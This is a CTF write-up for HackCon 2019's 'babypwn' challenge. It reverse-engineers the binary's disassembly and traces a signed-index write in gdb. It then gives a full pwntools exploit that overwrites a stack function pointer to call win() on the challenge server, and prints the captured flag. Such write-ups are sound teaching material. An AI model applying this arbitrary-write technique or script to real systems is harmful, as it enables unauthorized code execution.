I"¡^<p>A binary that doesnâ€™t require EIP control to exploit it. It has none of the obvious vulnerabilities (buffer overflow, format string, etc) but does have a very specific vulnerability that you had to find through reverse engineering.</p>

<p>Disclaimer: I didnâ€™t solve this challenge during the ctf. After it was over, r4j from JHDiscord released this <a href="https://github.com/r4j1337/ctf-writeups/blob/master/hackcon2019/pwn/babypwn/exploit.py">writeup</a>, but didnâ€™t provide any explanation as to how he found the solution, which I feel is important in this case since this is (in my opinion) more of an RE challenge than a pwn challenge, but I digress.</p>

<h3 id="challenge">Challenge</h3>

<ul>
  <li><strong>Category:</strong> pwn</li>
  <li><strong>Points:</strong> 451</li>
  <li><strong>Solves:</strong> 36</li>
</ul>

<blockquote>
  <p>You donâ€™t need eip control for every pwn. Service : <code class="highlighter-rouge">nc 68.183.158.95 8990</code></p>
</blockquote>

<p>The challenge provided the following files:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>babypwn
</code></pre></div></div>

<h3 id="solution">Solution</h3>

<p>As mentioned in the disclaimer, this challenge is more of an RE challenge although it is classified as a pwn challenge. As usual, letâ€™s start with a checksec.</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vagrant@ubuntu-bionic:/ctf/pwns/hackcon2019/pwn/babypwn<span class="nv">$ </span>checksec babypwn
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/ctf/pwns/hackcon2019/pwn/babypwn/babypwn'</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
</code></pre></div></div>

<p>So we see a canary, which basically tells us that we will need a way to leak the stack canary somehow if we were to try to do any buffer overflow attacks. Of course, the challenge description tells us we wonâ€™t need eip control, so letâ€™s try to run the binary and see what happens.</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vagrant@ubuntu-bionic:/ctf/pwns/hackcon2019/pwn/babypwn<span class="nv">$ </span>./babypwn
asd
qwe
a
zx
c
asd

qwe

a

zx

c

Naaa  , Try HArder
</code></pre></div></div>

<p>So it takes our input 5 times, then prints it back to us, before printing â€˜Naaa  , Try HArderâ€™. First instinct then is to obviously check for a format string vulnerability.</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vagrant@ubuntu-bionic:/ctf/pwns/hackcon2019/pwn/babypwn<span class="nv">$ </span>./babypwn
asd
%x
%x
%x
%x
asd

%x

%x

%x

%x

Naaa  , Try HArder
</code></pre></div></div>

<p>Nope, seems like it sanitizes our input. Alright, letâ€™s get to reverse engineering the binary. I use radare2 with the cutter GUI. The main function basically starts by setting an alarm and then setting some properties for stdin, stdout, and stderr. I will skip that part, and go to the important bits.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mh">0x0040093c</span>      <span class="n">lea</span>  <span class="n">rax</span><span class="p">,</span> <span class="p">[</span><span class="n">sym</span><span class="p">.</span><span class="n">nope</span><span class="p">]</span> <span class="p">;</span> <span class="mh">0x400817</span>
<span class="mh">0x00400943</span>      <span class="n">mov</span>  <span class="n">qword</span> <span class="p">[</span><span class="n">var_40h</span><span class="p">],</span> <span class="n">rax</span>
<span class="mh">0x00400947</span>      <span class="n">mov</span>  <span class="n">qword</span> <span class="p">[</span><span class="n">s</span><span class="p">],</span> <span class="mi">0</span>
<span class="p">....</span>
<span class="p">....</span>
<span class="mh">0x004009fe</span>      <span class="n">mov</span>  <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_40h</span><span class="p">]</span>
<span class="mh">0x00400a02</span>      <span class="n">call</span> <span class="n">rax</span>
<span class="mh">0x00400a04</span>      <span class="n">nop</span>
<span class="mh">0x00400a05</span>      <span class="n">mov</span>  <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="p">[</span><span class="n">canary</span><span class="p">]</span>
<span class="mh">0x00400a09</span>      <span class="n">xor</span>  <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="n">fs</span><span class="o">:</span><span class="p">[</span><span class="mh">0x28</span><span class="p">]</span>
</code></pre></div></div>

<p>Okay, so to begin with, at instruction <code class="highlighter-rouge">0x00400943</code> the address of the <code class="highlighter-rouge">nope()</code> function gets loaded into <code class="highlighter-rouge">var_40h</code> which is located at <code class="highlighter-rouge">rbp-0x40</code>. We then see a <code class="highlighter-rouge">mov rax, qword [var_40h]</code> followed by a <code class="highlighter-rouge">call rax</code> at <code class="highlighter-rouge">0x004009fe</code>. If we look at the disassembly for the <code class="highlighter-rouge">nope()</code> function, we will see that it outputs the string â€˜Naaa  , Try HArderâ€™, so we have to somehow be able to control this value at <code class="highlighter-rouge">rbp-0x40</code> and change it to something, because we know this <code class="highlighter-rouge">call rax</code> is what prints that string after taking our input 5 times. What do we change it to? Well, the binary also has a convenient <code class="highlighter-rouge">win()</code> function which outputs the flag. Simple as that, but how do we control this value at <code class="highlighter-rouge">rbp-0x40</code>?</p>

<p>Below is the section right after the binary has initialized all variables. We see that the <code class="highlighter-rouge">fgets()</code> call will read 0x11 bytes into the <code class="highlighter-rouge">var_50h</code> buffer (located at <code class="highlighter-rouge">rbp-0x50</code>, easily figured out by looking at the top of the disassembly for <code class="highlighter-rouge">main</code>, or with gdb).</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mh">0x00400983</span>      <span class="n">lea</span>  <span class="n">rax</span><span class="p">,</span> <span class="p">[</span><span class="n">var_50h</span><span class="p">]</span>
<span class="mh">0x00400987</span>      <span class="n">mov</span>  <span class="n">esi</span><span class="p">,</span> <span class="mh">0x11</span> <span class="p">;</span> <span class="mi">17</span> <span class="p">;</span> <span class="kt">int</span> <span class="n">size</span>
<span class="mh">0x0040098c</span>      <span class="n">mov</span>  <span class="n">rdi</span><span class="p">,</span> <span class="n">rax</span> <span class="p">;</span> <span class="kt">char</span> <span class="o">*</span><span class="n">s</span>
<span class="mh">0x0040098f</span>      <span class="n">call</span> <span class="n">sym</span><span class="p">.</span><span class="n">imp</span><span class="p">.</span><span class="n">fgets</span> <span class="p">;</span> <span class="kt">char</span> <span class="o">*</span><span class="n">fgets</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">s</span><span class="p">,</span> <span class="kt">int</span> <span class="n">size</span><span class="p">,</span> <span class="kt">FILE</span> <span class="o">*</span><span class="n">stream</span><span class="p">)</span>
<span class="mh">0x00400994</span>      <span class="n">mov</span>  <span class="n">edx</span><span class="p">,</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_44h</span><span class="p">]</span>
<span class="mh">0x00400997</span>      <span class="n">lea</span>  <span class="n">rax</span><span class="p">,</span> <span class="p">[</span><span class="n">var_30h</span><span class="p">]</span>
<span class="mh">0x0040099b</span>      <span class="n">movsxd</span> <span class="n">rdx</span><span class="p">,</span> <span class="n">edx</span>
<span class="mh">0x0040099e</span>      <span class="n">shl</span>  <span class="n">rdx</span><span class="p">,</span> <span class="mi">3</span>
<span class="mh">0x004009a2</span>      <span class="n">lea</span>  <span class="n">rcx</span><span class="p">,</span> <span class="p">[</span><span class="n">rax</span> <span class="o">+</span> <span class="n">rdx</span><span class="p">]</span>
<span class="mh">0x004009a6</span>      <span class="n">lea</span>  <span class="n">rax</span><span class="p">,</span> <span class="p">[</span><span class="n">var_50h</span><span class="p">]</span>
<span class="mh">0x004009aa</span>      <span class="n">mov</span>  <span class="n">edx</span><span class="p">,</span> <span class="mi">8</span> <span class="p">;</span> <span class="kt">size_t</span>  <span class="n">n</span>
<span class="mh">0x004009af</span>      <span class="n">mov</span>  <span class="n">rsi</span><span class="p">,</span> <span class="n">rax</span> <span class="p">;</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">src</span>
<span class="mh">0x004009b2</span>      <span class="n">mov</span>  <span class="n">rdi</span><span class="p">,</span> <span class="n">rcx</span> <span class="p">;</span> <span class="kt">char</span> <span class="o">*</span><span class="n">dest</span>
<span class="mh">0x004009b5</span>      <span class="n">call</span> <span class="n">sym</span><span class="p">.</span><span class="n">imp</span><span class="p">.</span><span class="n">strncpy</span> <span class="p">;</span> <span class="kt">char</span> <span class="o">*</span><span class="n">strncpy</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">dest</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">src</span><span class="p">,</span> <span class="kt">size_t</span>  <span class="n">n</span><span class="p">)</span>
</code></pre></div></div>

<p>So letâ€™s break it down shall we. Remember that our input is going to be <code class="highlighter-rouge">0x11</code> bytes big, stored at <code class="highlighter-rouge">rbp-0x50</code>, and the last byte will be set as <code class="highlighter-rouge">\0</code> by <code class="highlighter-rouge">fgets</code> (which isnâ€™t that important, but just pointing it out now).</p>

<ol>
  <li>
    <p><code class="highlighter-rouge">mov edx, dword [var_44h]</code> will move four bytes from <code class="highlighter-rouge">rbp-0x44</code> to <code class="highlighter-rouge">edx</code>. Our input starts at <code class="highlighter-rouge">rbp-0x50</code>, so calculating the offset, we get <code class="highlighter-rouge">(rbp-0x50) - (rbp-0x44) = 0x50 - 0x44 = 12</code>, therefore we know that it will take the 4 bytes right after the initial 12 bytes of our input, and move it into edx (which is basically the last four bytes of our input not counting the byte that gets converted to <code class="highlighter-rouge">\0</code>). To elaborate, if we typed in <code class="highlighter-rouge">ABCDEFGHIJKLMNOP\n</code>, it would move <code class="highlighter-rouge">MNOP</code> (which is just <code class="highlighter-rouge">\x4d\x4e\x4f\x50</code>, so <code class="highlighter-rouge">edx</code> will contain <code class="highlighter-rouge">0x504f4e4d</code> because of little endianness) into <code class="highlighter-rouge">edx</code>.</p>
  </li>
  <li>
    <p>Following that, it loads the effective address of <code class="highlighter-rouge">var_30h</code> (located at <code class="highlighter-rouge">rbp-0x30</code>) into <code class="highlighter-rouge">rax</code>.</p>
  </li>
  <li>
    <p>It will then do <code class="highlighter-rouge">movsxd rdx, edx</code>, which will (in this case) move the value from <code class="highlighter-rouge">edx</code> (a 32 bit register) to <code class="highlighter-rouge">rdx</code> (a 64 bit register), literally moving it in place in the same register, except that it will <code class="highlighter-rouge">sign-extend</code> the value from 32 bit to 64 bit. As an example: Given a value of <code class="highlighter-rouge">0xffffffff</code> in <code class="highlighter-rouge">edx</code>, it would be sign extended to the 64 bit version <code class="highlighter-rouge">0xffffffffffffffff</code> and stored in <code class="highlighter-rouge">rdx</code>. The value in <code class="highlighter-rouge">edx</code> in this case is the last 4 bytes of our input.</p>
  </li>
  <li>
    <p>Then, <code class="highlighter-rouge">shl rdx, 3</code> will left shift the sign extended version of our input by 3.</p>
  </li>
  <li>
    <p>Then, <code class="highlighter-rouge">lea rcx, [rax + rdx]</code> loads whatever is stored in the address <code class="highlighter-rouge">rax + rdx</code> into <code class="highlighter-rouge">rcx</code>. Since we control <code class="highlighter-rouge">rdx</code>, in a way, we also control what gets moved into <code class="highlighter-rouge">rcx</code> here, which is important.</p>
  </li>
  <li>
    <p>Then, <code class="highlighter-rouge">lea rax, [var_50h]</code> (again, same as <code class="highlighter-rouge">lea rax, rbp-0x50</code>) simply loads the address of our input into <code class="highlighter-rouge">rax</code>.</p>
  </li>
  <li>
    <p>Then, <code class="highlighter-rouge">strncpy((rax+rdx), rbp-0x50, 8)</code> is called, moving the first 8 bytes of our input into the address given by <code class="highlighter-rouge">rax+rdx</code></p>
  </li>
</ol>

<p>So basically, what we want to do is have <code class="highlighter-rouge">rax+rdx</code> equal <code class="highlighter-rouge">rbp-0x40</code>, so we can overwrite the address of <code class="highlighter-rouge">nope()</code> to the address of <code class="highlighter-rouge">win()</code> to get the flag.</p>

<p>So, we know that we can control <code class="highlighter-rouge">rdx</code>, but in order to figure out what we want <code class="highlighter-rouge">rax+rdx</code> to be, we need to open up gdb and set a breakpoint to just before <code class="highlighter-rouge">lea rcx, [rax + rdx]</code> and see what the values of the registers are.</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vagrant@ubuntu-bionic:/ctf/pwns/hackcon2019/pwn/babypwn<span class="nv">$ </span>gdb ./babypwn
gefâž¤  b <span class="k">*</span>0x004009a2
Breakpoint 1 at 0x4009a2

gefâž¤  run
Starting program: /ctf/pwns/hackcon2019/pwn/babypwn/babypwn
AAAAAAAABBBBBBBB

<span class="o">[</span> Legend: Modified register | Code | Heap | Stack | String <span class="o">]</span>

<span class="nv">$rax</span>   : 0x00007fffffffdae0  â†’  0x0000000000000000
<span class="nv">$rbx</span>   : 0x0
<span class="nv">$rcx</span>   : 0x00007ffff7af4081  â†’  0x5777fffff0003d48 <span class="o">(</span><span class="s2">"H="</span>?<span class="o">)</span>
<span class="nv">$rdx</span>   : 0x212121210
<span class="nv">$rsp</span>   : 0x00007fffffffdac0  â†’  <span class="s2">"AAAAAAAABBBBBBBB"</span>
<span class="nv">$rbp</span>   : 0x00007fffffffdb10  â†’  0x0000000000400a20  â†’  &lt;__libc_csu_init+0&gt; push r15

&lt;<span class="nt">--</span> TRUNCATED <span class="nt">--</span><span class="o">&gt;</span>

gefâž¤  p <span class="o">(</span><span class="nv">$rbp</span><span class="nt">-0x40</span><span class="o">)</span> - <span class="nv">$rax</span>
<span class="nv">$3</span> <span class="o">=</span> <span class="o">(</span>void <span class="k">*</span><span class="o">)</span> 0xfffffffffffffff0
</code></pre></div></div>

<p>Okay so since we want <code class="highlighter-rouge">rax+rdx == rbp-0x40</code>, we simply do <code class="highlighter-rouge">rbp-0x40 - rax</code> to find out what value we want rdx to be. In this case, we are told that we want <code class="highlighter-rouge">rdx</code> to finally end up with the value <code class="highlighter-rouge">0xfffffffffffffff0</code> (after the <code class="highlighter-rouge">shl</code> and <code class="highlighter-rouge">movsxd</code> instructions).</p>

<p><code class="highlighter-rouge">0xfffffffffffffff0</code> is just <code class="highlighter-rouge">0xfffffffffffffffe</code> left shifted by 3. We know this because the last byte <code class="highlighter-rouge">0xfe</code> is <code class="highlighter-rouge">1111 1110</code> in binary, and when left shifted by 3, gives us <code class="highlighter-rouge">1111 0000</code> in binary, which is <code class="highlighter-rouge">0xf0</code> in hex.</p>

<p><code class="highlighter-rouge">0xfffffffffffffffe</code> is just the sign extended version of <code class="highlighter-rouge">0xfffffffe</code>, and therefore, what we want is for the last 4 bytes of our input to be <code class="highlighter-rouge">0xfffffffe</code>. Since the four bytes before it wonâ€™t matter, so we can just pass in <code class="highlighter-rouge">0xfffffffe00000000</code>. Realistically? The 0â€™s can be anything as they donâ€™t affect anything.</p>

<p>So, now the plan is to make the first 8 bytes of our input the address of the <code class="highlighter-rouge">win()</code> function. The second 8 bytes will be <code class="highlighter-rouge">0xfffffffe00000000</code> (interpreted as <code class="highlighter-rouge">\x00\x00\x00\x00\xfe\xff\xff\xff</code> due to little endianness). The program is gonna do the calculations for us, and call <code class="highlighter-rouge">strncpy(rbp-0x40, rbp-0x50, 8)</code> which will copy the address of the <code class="highlighter-rouge">win()</code> function and replace the address of the <code class="highlighter-rouge">nope()</code> function with it.</p>

<p>The exploit is shown below. We also account for the fact that the program wants our input 5 times in a row before continuing:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python2
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span> <span class="o">=</span> <span class="s">'68.183.158.95'</span><span class="p">,</span> <span class="mi">8990</span>
<span class="n">BINARY</span> <span class="o">=</span> <span class="s">'./babypwn'</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">BINARY</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">args</span><span class="o">.</span><span class="n">REMOTE</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">process</span><span class="p">(</span><span class="n">BINARY</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">debug</span><span class="p">(</span><span class="n">breakpoints</span><span class="p">):</span>
	<span class="n">gdbscript</span> <span class="o">=</span> <span class="s">''</span>

	<span class="k">for</span> <span class="n">bp</span> <span class="ow">in</span> <span class="n">breakpoints</span><span class="p">:</span>
		<span class="n">gdbscript</span> <span class="o">+=</span> <span class="s">'b *0x{:x}</span><span class="se">\n</span><span class="s">'</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">bp</span><span class="p">)</span>
	<span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">)</span>

<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'new-window'</span><span class="p">]</span>
<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
<span class="k">if</span> <span class="ow">not</span> <span class="n">args</span><span class="o">.</span><span class="n">REMOTE</span> <span class="ow">and</span> <span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
	<span class="n">debug</span><span class="p">([</span><span class="mh">0x00400994</span><span class="p">])</span>

<span class="n">win</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'win'</span><span class="p">]</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'win: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">win</span><span class="p">))</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">win</span><span class="p">)</span> <span class="c1"># The first 8 bytes of our input
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xfffffffe00000000</span><span class="p">)</span> <span class="c1"># The second 8 bytes of our input
</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="o">*</span><span class="mi">6</span> <span class="c1"># Send no input for the remaining times, so we don't affect anything
</span>
<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>

</code></pre></div></div>

<p>Running the exploit:</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vagrant@ubuntu-bionic:/ctf/pwns/hackcon2019/pwn/babypwn<span class="nv">$ </span>./exploit.py REMOTE
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/ctf/pwns/hackcon2019/pwn/babypwn/babypwn'</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
<span class="o">[</span>+] Opening connection to 68.183.158.95 on port 8990: Done
<span class="o">[</span><span class="k">*</span><span class="o">]</span> win: 0x400831
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode










Yay , Here<span class="s1">'s the flag
d4rk{B0fs_4r3_3zzzz}c0de
[*] Got EOF while reading in interactive
$
</span></code></pre></div></div>

<p>Flag: <code class="highlighter-rouge">d4rk{B0fs_4r3_3zzzz}c0de</code></p>

<p>Overall it was a good challenge, but I think it was more RE than pwn, so it should have been classified as such, but oh well.</p>
:ET